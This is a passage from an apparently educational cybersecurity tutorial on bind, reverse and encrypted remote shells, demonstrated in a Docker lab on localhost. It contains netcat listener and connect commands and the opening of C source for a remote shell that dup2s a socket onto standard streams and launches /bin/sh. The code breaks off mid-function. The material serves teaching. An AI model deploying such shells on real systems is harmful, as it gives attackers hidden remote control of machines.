    <span id="cb225-2"><a href="#cb225-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity6:latest</span>
    <span id="cb225-3"><a href="#cb225-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@7e837bd2c6b2:~#</span> ./server 5000</span>
    <span id="cb225-4"><a href="#cb225-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb225-5"><a href="#cb225-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb225-6"><a href="#cb225-6" aria-hidden="true" tabindex="-1"></a><span class="co"># terminal 2</span></span>
    <span id="cb225-7"><a href="#cb225-7" aria-hidden="true" tabindex="-1"></a><span class="co"># we figure out the running docker container&#39;s ID</span></span>
    <span id="cb225-8"><a href="#cb225-8" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> ps</span>
    <span id="cb225-9"><a href="#cb225-9" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES</span>
    <span id="cb225-10"><a href="#cb225-10" aria-hidden="true" tabindex="-1"></a><span class="ex">7e837bd2c6b2</span>        basic_cybersecurity6:latest   <span class="st">&quot;bash&quot;</span>              24 seconds ago      Up 23 seconds                           ecstatic_golick</span>
    <span id="cb225-11"><a href="#cb225-11" aria-hidden="true" tabindex="-1"></a><span class="co"># get a shell into the container</span></span>
    <span id="cb225-12"><a href="#cb225-12" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> 7e837bd2c6b2 bash</span>
    <span id="cb225-13"><a href="#cb225-13" aria-hidden="true" tabindex="-1"></a><span class="co"># get a direct remote shell</span></span>
    <span id="cb225-14"><a href="#cb225-14" aria-hidden="true" tabindex="-1"></a><span class="ex">root@7e837bd2c6b2:~#</span> nc 127.0.0.1 5000</span>
    <span id="cb225-15"><a href="#cb225-15" aria-hidden="true" tabindex="-1"></a><span class="co"># ls</span></span>
    <span id="cb225-16"><a href="#cb225-16" aria-hidden="true" tabindex="-1"></a><span class="ex">checksec.sh</span></span>
    <span id="cb225-17"><a href="#cb225-17" aria-hidden="true" tabindex="-1"></a><span class="ex">client</span></span>
    <span id="cb225-18"><a href="#cb225-18" aria-hidden="true" tabindex="-1"></a><span class="ex">client.c</span></span>
    <span id="cb225-19"><a href="#cb225-19" aria-hidden="true" tabindex="-1"></a><span class="ex">rp++</span></span>
    <span id="cb225-20"><a href="#cb225-20" aria-hidden="true" tabindex="-1"></a><span class="ex">server</span></span>
    <span id="cb225-21"><a href="#cb225-21" aria-hidden="true" tabindex="-1"></a><span class="ex">server.c</span></span>
    <span id="cb225-22"><a href="#cb225-22" aria-hidden="true" tabindex="-1"></a><span class="co"># uname -a</span></span>
    <span id="cb225-23"><a href="#cb225-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Linux</span> 7e837bd2c6b2 4.9.87-linuxkit-aufs <span class="co">#1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span></code></pre></div>
    <p>or running server in the docker container and client in the host machine:</p>
    <pre><code># terminal 1
    docker run --privileged -p 5000:5000 -it basic_cybersecurity6:latest
    root@81bffa48f8a3:~# ./server 5000


    # terminal 2
    nc localhost 5000
    $ nc localhost 5000
    # uname -a
    Linux 81bffa48f8a3 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    #</code></pre>
    <p>Note that we had to map port 5000 between docker and the host OS.</p>
    <h3 id="reverse-remote-shells">Reverse Remote Shells</h3>
    <div class="sourceCode" id="cb227"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb227-1"><a href="#cb227-1" aria-hidden="true" tabindex="-1"></a><span class="co"># terminal 1</span></span>
    <span id="cb227-2"><a href="#cb227-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">--privileged</span> <span class="at">-p</span> 5000:5000 <span class="at">-it</span> basic_cybersecurity6:latest</span>
    <span id="cb227-3"><a href="#cb227-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@812b61f0f7cc:~#</span> nc <span class="at">-l</span> <span class="at">-p</span> 5000</span>
    <span id="cb227-4"><a href="#cb227-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb227-5"><a href="#cb227-5" aria-hidden="true" tabindex="-1"></a><span class="co"># terminal 2</span></span>
    <span id="cb227-6"><a href="#cb227-6" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> ps</span>
    <span id="cb227-7"><a href="#cb227-7" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES</span>
    <span id="cb227-8"><a href="#cb227-8" aria-hidden="true" tabindex="-1"></a><span class="ex">812b61f0f7cc</span>        basic_cybersecurity6:latest   <span class="st">&quot;bash&quot;</span>              3 seconds ago       Up 6 seconds        0.0.0.0:5000-<span class="op">&gt;</span>5000/tcp   reverent_haibt</span>
    <span id="cb227-9"><a href="#cb227-9" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> 812b61f0f7cc bash</span>
    <span id="cb227-10"><a href="#cb227-10" aria-hidden="true" tabindex="-1"></a><span class="ex">root@812b61f0f7cc:~#</span></span>
    <span id="cb227-11"><a href="#cb227-11" aria-hidden="true" tabindex="-1"></a><span class="ex">root@812b61f0f7cc:~#</span> ./client 127.0.0.1 5000</span>
    <span id="cb227-12"><a href="#cb227-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb227-13"><a href="#cb227-13" aria-hidden="true" tabindex="-1"></a><span class="co"># terminal 1</span></span>
    <span id="cb227-14"><a href="#cb227-14" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
    <span id="cb227-15"><a href="#cb227-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Linux</span> 812b61f0f7cc 4.9.87-linuxkit-aufs <span class="co">#1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span></code></pre></div>
    <h3 id="encrypted-remote-shell">Encrypted remote shell</h3>
    <p>Following from previous code and taking inspiration from [4], we will extend the previous example to encrypt the data stream.</p>
    <p>To begin with, as nicely explained at [4]:</p>
    <blockquote>
    <p>In order to crypt our communication, we need something in front of the shell that gets the data from/to the network and crypts/decrypts it. This can be done in many different ways.</p>
    <p>This time we have choose to launch the shell as a separated child process and use a socketpair to transfer the data received/sent through the network to the shell process. The father process will then crypt and decrypt the data going into/coming from the network/shell. This may look a bit confusing at first glance, but that is just because of my writing :).</p>
    <p>A socketpair is just a pair of sockets that are immediately connected. Something like running the client and server code in just one system call. Conceptually they behave as a pipe but the main difference is that the sockets are bidirectional in opposition to a pipe where one of the file descriptors is read only and the other one is write only.</p>
    <p><code>socketpairs</code> are a convenient IPC (InterProcess Communication) mechanism and fits pretty well in our network oriented use case… because they are sockets after all.</p>
    </blockquote>
    <p>Code for crypting and de-crypting the communications over a remote shell is presented (and commented) below:</p>
    <div class="sourceCode" id="cb228"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb228-1"><a href="#cb228-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb228-2"><a href="#cb228-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
    <span id="cb228-3"><a href="#cb228-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
    <span id="cb228-4"><a href="#cb228-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb228-5"><a href="#cb228-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
    <span id="cb228-6"><a href="#cb228-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;arpa/inet.h&gt;</span></span>
    <span id="cb228-7"><a href="#cb228-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/time.h&gt;</span></span>
    <span id="cb228-8"><a href="#cb228-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
    <span id="cb228-9"><a href="#cb228-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb228-10"><a href="#cb228-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-11"><a href="#cb228-11" aria-hidden="true" tabindex="-1"></a><span class="co">// Creates a socket, fills in the network data and binds the socket</span></span>
    <span id="cb228-12"><a href="#cb228-12" aria-hidden="true" tabindex="-1"></a><span class="co">// to a specific port given as a parameter.</span></span>
    <span id="cb228-13"><a href="#cb228-13" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-14"><a href="#cb228-14" aria-hidden="true" tabindex="-1"></a><span class="co">// Note that the address passed to bind is the constant INADDR_ANY.</span></span>
    <span id="cb228-15"><a href="#cb228-15" aria-hidden="true" tabindex="-1"></a><span class="co">// This is actually IP 0.0.0.0 and it means that the socket will be</span></span>
    <span id="cb228-16"><a href="#cb228-16" aria-hidden="true" tabindex="-1"></a><span class="co">// listening on all interfaces.</span></span>
    <span id="cb228-17"><a href="#cb228-17" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-18"><a href="#cb228-18" aria-hidden="true" tabindex="-1"></a><span class="co">// Returns file descriptor of the accepted connection.</span></span>
    <span id="cb228-19"><a href="#cb228-19" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb228-20"><a href="#cb228-20" aria-hidden="true" tabindex="-1"></a>server_init <span class="op">(</span><span class="dt">int</span> port<span class="op">)</span></span>
    <span id="cb228-21"><a href="#cb228-21" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-22"><a href="#cb228-22" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> s<span class="op">,</span> s1<span class="op">;</span></span>
    <span id="cb228-23"><a href="#cb228-23" aria-hidden="true" tabindex="-1"></a>        socklen_t clen<span class="op">;</span></span>
    <span id="cb228-24"><a href="#cb228-24" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> sockaddr_in serv<span class="op">,</span> client<span class="op">;</span></span>
    <span id="cb228-25"><a href="#cb228-25" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-26"><a href="#cb228-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>s <span class="op">=</span> socket <span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-27"><a href="#cb228-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-28"><a href="#cb228-28" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;socket:&quot;</span><span class="op">);</span></span>
    <span id="cb228-29"><a href="#cb228-29" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-30"><a href="#cb228-30" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-31"><a href="#cb228-31" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-32"><a href="#cb228-32" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
    <span id="cb228-33"><a href="#cb228-33" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_port <span class="op">=</span> htons<span class="op">(</span>port<span class="op">);</span></span>
    <span id="cb228-34"><a href="#cb228-34" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_addr<span class="op">.</span>s_addr <span class="op">=</span> htonl<span class="op">(</span>INADDR_ANY<span class="op">);</span></span>
    <span id="cb228-35"><a href="#cb228-35" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-36"><a href="#cb228-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>bind <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)&amp;</span>serv<span class="op">,</span></span>
    <span id="cb228-37"><a href="#cb228-37" aria-hidden="true" tabindex="-1"></a>                   <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> sockaddr_in<span class="op">)))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-38"><a href="#cb228-38" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-39"><a href="#cb228-39" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;bind:&quot;</span><span class="op">);</span></span>
    <span id="cb228-40"><a href="#cb228-40" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-41"><a href="#cb228-41" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-42"><a href="#cb228-42" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-43"><a href="#cb228-43" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>listen <span class="op">(</span>s<span class="op">,</span> <span class="dv">10</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-44"><a href="#cb228-44" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-45"><a href="#cb228-45" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;listen:&quot;</span><span class="op">);</span></span>
    <span id="cb228-46"><a href="#cb228-46" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-47"><a href="#cb228-47" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-48"><a href="#cb228-48" aria-hidden="true" tabindex="-1"></a>        clen <span class="op">=</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> sockaddr_in<span class="op">);</span></span>
    <span id="cb228-49"><a href="#cb228-49" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>s1 <span class="op">=</span> accept <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)</span> <span class="op">&amp;</span>client<span class="op">,</span></span>
    <span id="cb228-50"><a href="#cb228-50" aria-hidden="true" tabindex="-1"></a>                          <span class="op">&amp;</span>clen<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-51"><a href="#cb228-51" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-52"><a href="#cb228-52" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;accept:&quot;</span><span class="op">);</span></span>
    <span id="cb228-53"><a href="#cb228-53" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-54"><a href="#cb228-54" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-55"><a href="#cb228-55" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> s1<span class="op">;</span></span>
    <span id="cb228-56"><a href="#cb228-56" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-57"><a href="#cb228-57" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb228-58"><a href="#cb228-58" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-59"><a href="#cb228-59" aria-hidden="true" tabindex="-1"></a><span class="co">// Receives as parameters an IP address to connect to</span></span>
    <span id="cb228-60"><a href="#cb228-60" aria-hidden="true" tabindex="-1"></a><span class="co">// and a port. Then it creates a TCP socket (SOCK_STREAM)</span></span>
    <span id="cb228-61"><a href="#cb228-61" aria-hidden="true" tabindex="-1"></a><span class="co">// and fills in the data for connecting. The connection</span></span>
    <span id="cb228-62"><a href="#cb228-62" aria-hidden="true" tabindex="-1"></a><span class="co">// is effectively established after a successful execution</span></span>
    <span id="cb228-63"><a href="#cb228-63" aria-hidden="true" tabindex="-1"></a><span class="co">// of connect. In case of any error (creating the socket or</span></span>
    <span id="cb228-64"><a href="#cb228-64" aria-hidden="true" tabindex="-1"></a><span class="co">// connection) we just stop the application.</span></span>
    <span id="cb228-65"><a href="#cb228-65" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-66"><a href="#cb228-66" aria-hidden="true" tabindex="-1"></a><span class="co">// Returns the file descriptor from where to send/receive</span></span>
    <span id="cb228-67"><a href="#cb228-67" aria-hidden="true" tabindex="-1"></a><span class="co">// client data</span></span>
    <span id="cb228-68"><a href="#cb228-68" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb228-69"><a href="#cb228-69" aria-hidden="true" tabindex="-1"></a>client_init <span class="op">(</span><span class="dt">char</span> <span class="op">*</span>ip<span class="op">,</span> <span class="dt">int</span> port<span class="op">)</span></span>
    <span id="cb228-70"><a href="#cb228-70" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-71"><a href="#cb228-71" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> s<span class="op">;</span></span>
    <span id="cb228-72"><a href="#cb228-72" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> sockaddr_in serv<span class="op">;</span></span>
    <span id="cb228-73"><a href="#cb228-73" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-74"><a href="#cb228-74" aria-hidden="true" tabindex="-1"></a>        printf <span class="op">(</span><span class="st">&quot;+ Connecting to %s:%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> ip<span class="op">,</span> port<span class="op">);</span></span>
    <span id="cb228-75"><a href="#cb228-75" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-76"><a href="#cb228-76" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>s <span class="op">=</span> socket <span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-77"><a href="#cb228-77" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-78"><a href="#cb228-78" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;socket:&quot;</span><span class="op">);</span></span>
    <span id="cb228-79"><a href="#cb228-79" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-80"><a href="#cb228-80" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-81"><a href="#cb228-81" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-82"><a href="#cb228-82" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
    <span id="cb228-83"><a href="#cb228-83" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_port <span class="op">=</span> htons<span class="op">(</span>port<span class="op">);</span></span>
    <span id="cb228-84"><a href="#cb228-84" aria-hidden="true" tabindex="-1"></a>        serv<span class="op">.</span>sin_addr<span class="op">.</span>s_addr <span class="op">=</span> inet_addr<span class="op">(</span>ip<span class="op">);</span></span>
    <span id="cb228-85"><a href="#cb228-85" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-86"><a href="#cb228-86" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>connect <span class="op">(</span>s<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)</span> <span class="op">&amp;</span>serv<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>serv<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb228-87"><a href="#cb228-87" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-88"><a href="#cb228-88" aria-hidden="true" tabindex="-1"></a>                perror<span class="op">(</span><span class="st">&quot;connect:&quot;</span><span class="op">);</span></span>
    <span id="cb228-89"><a href="#cb228-89" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb228-90"><a href="#cb228-90" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb228-91"><a href="#cb228-91" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-92"><a href="#cb228-92" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> s<span class="op">;</span></span>
    <span id="cb228-93"><a href="#cb228-93" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb228-94"><a href="#cb228-94" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-95"><a href="#cb228-95" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-96"><a href="#cb228-96" aria-hidden="true" tabindex="-1"></a><span class="co">// Function that allow us to implement a reverse remote shell.</span></span>
    <span id="cb228-97"><a href="#cb228-97" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-98"><a href="#cb228-98" aria-hidden="true" tabindex="-1"></a><span class="co">// It makes use of two system calls dup2 and execv. The first one</span></span>
    <span id="cb228-99"><a href="#cb228-99" aria-hidden="true" tabindex="-1"></a><span class="co">// duplicates a given file descriptor. In this case, the three</span></span>
    <span id="cb228-100"><a href="#cb228-100" aria-hidden="true" tabindex="-1"></a><span class="co">// calls at the beginning of the function, assigns the file</span></span>
    <span id="cb228-101"><a href="#cb228-101" aria-hidden="true" tabindex="-1"></a><span class="co">// descriptor received as parameter to the Standard Input (file</span></span>
    <span id="cb228-102"><a href="#cb228-102" aria-hidden="true" tabindex="-1"></a><span class="co">//  descriptor 0), Standard Output (file descriptor 1) and</span></span>
    <span id="cb228-103"><a href="#cb228-103" aria-hidden="true" tabindex="-1"></a><span class="co">// Standard Error (file descriptor 3).</span></span>
    <span id="cb228-104"><a href="#cb228-104" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-105"><a href="#cb228-105" aria-hidden="true" tabindex="-1"></a><span class="co">// If the file descriptor we pass as a parameter is one of the</span></span>
    <span id="cb228-106"><a href="#cb228-106" aria-hidden="true" tabindex="-1"></a><span class="co">// sockets created with our previous client and server functions,</span></span>
    <span id="cb228-107"><a href="#cb228-107" aria-hidden="true" tabindex="-1"></a><span class="co">// we are effectively sending and receiving data through the</span></span>
    <span id="cb228-108"><a href="#cb228-108" aria-hidden="true" tabindex="-1"></a><span class="co">// network every time we write data to the console and we read data</span></span>
    <span id="cb228-109"><a href="#cb228-109" aria-hidden="true" tabindex="-1"></a><span class="co">// from stdin.</span></span>
    <span id="cb228-110"><a href="#cb228-110" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb228-111"><a href="#cb228-111" aria-hidden="true" tabindex="-1"></a>start_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb228-112"><a href="#cb228-112" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-113"><a href="#cb228-113" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">3</span><span class="op">];</span></span>
    <span id="cb228-114"><a href="#cb228-114" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-115"><a href="#cb228-115" aria-hidden="true" tabindex="-1"></a>        printf <span class="op">(</span><span class="st">&quot;+ Starting shell</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb228-116"><a href="#cb228-116" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb228-117"><a href="#cb228-117" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-118"><a href="#cb228-118" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
    <span id="cb228-119"><a href="#cb228-119" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-120"><a href="#cb228-120" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb228-121"><a href="#cb228-121" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;-i&quot;</span><span class="op">;</span></span>
    <span id="cb228-122"><a href="#cb228-122" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb228-123"><a href="#cb228-123" aria-hidden="true" tabindex="-1"></a>        execv <span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name <span class="op">);</span></span>
    <span id="cb228-124"><a href="#cb228-124" aria-hidden="true" tabindex="-1"></a>        exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb228-125"><a href="#cb228-125" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-126"><a href="#cb228-126" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb228-127"><a href="#cb228-127" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb228-128"><a href="#cb228-128" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-129"><a href="#cb228-129" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-130"><a href="#cb228-130" aria-hidden="true" tabindex="-1"></a><span class="co">// This function decode the information received from the network sends</span></span>
    <span id="cb228-131"><a href="#cb228-131" aria-hidden="true" tabindex="-1"></a><span class="co">// it to the shell using the counterpart socket (from the socketpair)</span></span>
    <span id="cb228-132"><a href="#cb228-132" aria-hidden="true" tabindex="-1"></a><span class="co">// system call.</span></span>
    <span id="cb228-133"><a href="#cb228-133" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-134"><a href="#cb228-134" aria-hidden="true" tabindex="-1"></a><span class="co">// At the same time, whenever the shell produces some output, this function</span></span>
    <span id="cb228-135"><a href="#cb228-135" aria-hidden="true" tabindex="-1"></a><span class="co">// will read that data, crypt it and send it over the network.</span></span>
    <span id="cb228-136"><a href="#cb228-136" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb228-137"><a href="#cb228-137" aria-hidden="true" tabindex="-1"></a><span class="co">// Receives as parameters two file descriptors, one representing the</span></span>
    <span id="cb228-138"><a href="#cb228-138" aria-hidden="true" tabindex="-1"></a><span class="co">// socketpair end for communications with the shell (s1) and the</span></span>
    <span id="cb228-139"><a href="#cb228-139" aria-hidden="true" tabindex="-1"></a><span class="co">// other for networking (s).</span></span>
    <span id="cb228-140"><a href="#cb228-140" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span></span>
    <span id="cb228-141"><a href="#cb228-141" aria-hidden="true" tabindex="-1"></a>async_read <span class="op">(</span><span class="dt">int</span> s<span class="op">,</span> <span class="dt">int</span> s1<span class="op">)</span></span>
    <span id="cb228-142"><a href="#cb228-142" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb228-143"><a href="#cb228-143" aria-hidden="true" tabindex="-1"></a>        fd_set rfds<span class="op">;</span></span>
    <span id="cb228-144"><a href="#cb228-144" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> timeval tv<span class="op">;</span></span>
    <span id="cb228-145"><a href="#cb228-145" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> max <span class="op">=</span> s <span class="op">&gt;</span> s1 <span class="op">?</span> s <span class="op">:</span> s1<span class="op">;</span></span>
    <span id="cb228-146"><a href="#cb228-146" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">,</span> r<span class="op">;</span></span>
    <span id="cb228-147"><a href="#cb228-147" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">1024</span><span class="op">];</span></span>
    <span id="cb228-148"><a href="#cb228-148" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb228-149"><a href="#cb228-149" aria-hidden="true" tabindex="-1"></a>        max<span class="op">++;</span></span>
    <span id="cb228-150"><a href="#cb228-150" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span></span>
    <span id="cb228-151"><a href="#cb228-151" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb228-152"><a href="#cb228-152" aria-hidden="true" tabindex="-1"></a>                <span class="co">// macros to initialize the file descriptor set</span></span>
